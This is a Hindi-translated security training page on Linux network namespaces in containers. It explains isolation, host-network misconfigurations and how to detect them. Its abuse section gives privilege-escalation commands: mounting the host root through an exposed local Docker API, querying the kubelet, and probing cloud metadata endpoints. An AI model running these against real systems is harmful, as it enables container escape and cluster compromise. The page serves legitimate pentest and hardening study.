# नेटवर्क नेमस्पेस

{{#include ../../../../../banners/hacktricks-training.md}}

## अवलोकन

नेटवर्क नेमस्पेस ऐसे नेटवर्क-सम्बंधित संसाधनों को अलग करता है जैसे इंटरफेस, IP पते, routing tables, ARP/neighbor state, फ़ायरवॉल नियम, सॉकेट्स, और `/proc/net` जैसे फाइलों की सामग्री। इसलिए एक container के पास ऐसा दिखने वाला अपना `eth0`, अपने स्थानीय रूट्स, और अपनी loopback डिवाइस हो सकती है बिना होस्ट के वास्तविक नेटवर्क स्टैक की मालिकियत के।

सुरक्षा के दृष्टिकोण से, यह इसलिए महत्वपूर्ण है क्योंकि network isolation केवल पोर्ट बाइंडिंग से कहीं अधिक है। एक निजी नेटवर्क नेमस्पेस सीमित करता है कि workload क्या सीधे देख या reconfigure कर सकता है। एक बार जब वह नेमस्पेस होस्ट के साथ साझा हो जाता है, तो container अचानक होस्ट listeners, होस्ट-लोकल सेवाओं, और नेटवर्क कंट्रोल पॉइंट्स को देख सकता है जो कभी application को एक्सपोज़ करने के लिए नहीं बनाए गए थे।

## संचालन

नया बनाया गया network namespace तब तक लगभग खाली नेटवर्क पर्यावरण के साथ शुरू होता है जब तक कि इंटरफेस उससे जोड़े नहीं जाते। कंटेनर रनटाइम फिर virtual interfaces बनाते या कनेक्ट करते हैं, पते असाइन करते हैं, और routes कॉन्फ़िगर करते हैं ताकि workload को अपेक्षित कनेक्टिविटी मिल सके। ब्रिज-आधारित डिप्लॉयमेंट्स में, इसका सामान्य अर्थ है कि container को एक veth-backed интерфेस दिखाई देता है जो एक host bridge से जुड़ा होता है। In Kubernetes, CNI plugins Pod networking के लिए समकक्ष सेटअप को हैंडल करते हैं।

यह वास्तुकला समझाती है कि `--network=host` या `hostNetwork: true` इतना बड़ा परिवर्तन क्यों है। एक तैयार निजी नेटवर्क स्टैक प्राप्त करने के बजाय, workload होस्ट के वास्तविक नेटवर्क से जुड़ जाता है।

## लैब

आप लगभग खाली नेटवर्क नेमस्पेस को निम्नलिखित के साथ देख सकते हैं:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
और आप normal और host-networked containers की तुलना निम्नलिखित से कर सकते हैं:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
host-networked कंटेनर अब अपना अलग socket और interface व्यू नहीं रखता। यह बदलाव अपने आप में काफी महत्वपूर्ण है, उससे पहले कि आप यह पूछें कि प्रोसेस के पास कौन सी capabilities हैं।

## रनटाइम उपयोग

Docker और Podman सामान्यतः हर कंटेनर के लिए एक निजी network namespace बनाते हैं जब तक कि अलग कॉन्फ़िगर न किया गया हो। Kubernetes आम तौर पर हर Pod को उसका अपना network namespace देता है, जो Pod के अंदर वाले कंटेनरों द्वारा साझा होता है लेकिन host से अलग रहता है। Incus/LXC सिस्टम भी network-namespace आधारित समृद्ध隔離 प्रदान करते हैं, अक्सर वर्चुअल नेटवर्किंग सेटअप की एक विस्तृत विविधता के साथ।

सामान्य सिद्धांत यह है कि निजी नेटवर्किंग डिफ़ॉल्ट隔離 सीमा होती है, जबकि host networking उस सीमा से स्पष्ट opt-out होता है।

## Misconfigurations

सबसे महत्वपूर्ण गलत कॉन्फ़िगरेशन बस host network namespace को साझा करना है। यह कभी-कभी प्रदर्शन, low-level monitoring, या सुविधाजनकता के लिए किया जाता है, लेकिन यह कंटेनरों के लिए उपलब्ध सबसे साफ़ सीमाओं में से एक को हटा देता है। Host-local listeners अधिक प्रत्यक्ष तरीके से पहुंच योग्य हो जाते हैं, localhost-only सेवाएँ उपलब्ध हो सकती हैं, और ऐसी capabilities जैसे `CAP_NET_ADMIN` या `CAP_NET_RAW` बहुत अधिक खतरनाक हो जाती हैं क्योंकि उनके द्वारा सक्षम किए गए ऑपरेशन अब host के अपने नेटवर्क वातावरण पर लागू होते हैं।

एक और समस्या तब होती है जब नेटवर्क-संबंधित capabilities को अधिक दे दिया जाता है भले ही network namespace निजी हो। निजी namespace मदद करता है, लेकिन यह raw sockets या उन्नत नेटवर्क नियंत्रण को हानिरहित नहीं बना देता।

Kubernetes में, `hostNetwork: true` यह भी बदल देता है कि आप Pod-स्तर की network segmentation पर कितना भरोसा कर सकते हैं। Kubernetes दस्तावेज़ बताते हैं कि कई network plugins `hostNetwork` Pod ट्रैफ़िक को `podSelector` / `namespaceSelector` मैचिंग के लिए सही तरीके से अलग नहीं कर पाते और इसलिए इसे सामान्य node ट्रैफ़िक की तरह मानते हैं। एक हमलावर के नज़रिये से, इसका मतलब है कि एक समझौता किया हुआ `hostNetwork` workload अक्सर एक node-स्तरीय नेटवर्क foothold के रूप में माना जाना चाहिए न कि एक सामान्य Pod के रूप में जो overlay-network workloads की तरह उन्हीं नीति धारणाओं से सीमित हो।

## दुरुपयोग

कमज़ोर隔離 सेटअप में, हमलावर host listening सेवाओं का निरीक्षण कर सकते हैं, केवल loopback से बँधे management endpoints तक पहुँच सकते हैं, ट्रैफ़िक को sniff या interfere कर सकते हैं जो कि उपलब्ध capabilities और वातावरण पर निर्भर करता है, या `CAP_NET_ADMIN` मौजूद होने पर routing और firewall स्थिति को पुन:कॉन्फ़िगर कर सकते हैं। एक क्लस्टर में, यह lateral movement और control-plane reconnaissance को भी आसान बना सकता है।

यदि आप host networking का संदेह करते हैं, तो शुरू करें यह पुष्टि करके कि दिखाई देने वाले interfaces और listeners एक अलग कंटेनर नेटवर्क के बजाय host के हैं:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only सेवाएँ अक्सर पहली रोचक खोज होती हैं:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
यदि network capabilities मौजूद हैं, तो जाँच करें कि workload दृश्य stack का निरीक्षण या परिवर्तन कर सकता है:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
आधुनिक kernels पर, host networking और `CAP_NET_ADMIN` मिलकर साधारण `iptables` / `nftables` परिवर्तनों से आगे भी packet path को उजागर कर सकते हैं। `tc` qdiscs और filters भी namespace-scoped होते हैं, इसलिए shared host network namespace में वे host interfaces पर लागू होते हैं जिन्हें container देख सकता है। यदि `CAP_BPF` भी मौजूद है, तो network-related eBPF programs जैसे TC और XDP loaders भी प्रासंगिक हो जाते हैं:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
यह महत्वपूर्ण है क्योंकि एक हमलावर host interface स्तर पर ट्रैफ़िक को mirror, redirect, shape, या drop कर सकता है — सिर्फ़ firewall rules को ही rewrite करना नहीं। एक private network namespace में ये क्रियाएँ container view तक सीमित रहती हैं; एक shared host namespace में ये host-impacting हो जाती हैं।

cluster या cloud वातावरणों में, host networking स्थानीय रूप से metadata और control-plane-adjacent सेवाओं का त्वरित recon करने का भी औचित्य देता है:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### पूरा उदाहरण: Host Networking + Local Runtime / Kubelet Access

Host networking स्वचालित रूप से host root प्रदान नहीं करता, लेकिन यह अक्सर उन सेवाओं को उजागर करता है जो जानबूझकर केवल नोड से ही पहुँचने योग्य होती हैं। यदि उन सेवाओं में से कोई कमजोर सुरक्षा वाली है, तो host networking एक सीधा privilege-escalation मार्ग बन जाता है।

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet localhost पर:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
प्रभाव:

- यदि स्थानीय runtime API बिना उचित सुरक्षा के एक्सपोज़ हो तो सीधे होस्ट का समझौता हो सकता है
- यदि kubelet या स्थानीय एजेंट्स पहुँच योग्य हों तो cluster reconnaissance या lateral movement संभव है
- `CAP_NET_ADMIN` के साथ मिलने पर traffic manipulation या denial of service संभव हो सकता है

## जाँच

इन जांचों का उद्देश्य यह पता लगाना है कि क्या प्रक्रिया के पास एक private network stack है, कौन से routes और listeners दिखाई दे रहे हैं, और क्या network view पहले से ही host जैसा दिखता है इससे पहले कि आप capabilities का परीक्षण करें।
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
What is interesting here:

- If `/proc/self/ns/net` and `/proc/1/ns/net` already look host-like, the container may be sharing the host network namespace or another non-private namespace.
- `lsns -t net` and `ip netns identify` are useful when the shell is already inside a named or persistent namespace and you want to correlate it with `/run/netns` objects from the host side.
- `ss -lntup` is especially valuable because it reveals loopback-only listeners and local management endpoints.
- Routes, interface names, firewall context, `tc` state, and eBPF attachments become much more important if `CAP_NET_ADMIN`, `CAP_NET_RAW`, or `CAP_BPF` is present.
- In Kubernetes, failed service-name resolution from a `hostNetwork` Pod may simply mean the Pod is not using `dnsPolicy: ClusterFirstWithHostNet`, not that the service is absent.

जब किसी container की समीक्षा कर रहे हों, तो हमेशा network namespace को capability set के साथ मिलाकर आकलन करें। Host networking और मजबूत network capabilities का संयोजन bridge networking और संकुचित default capability set से बहुत अलग स्थिति बनाता है।

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
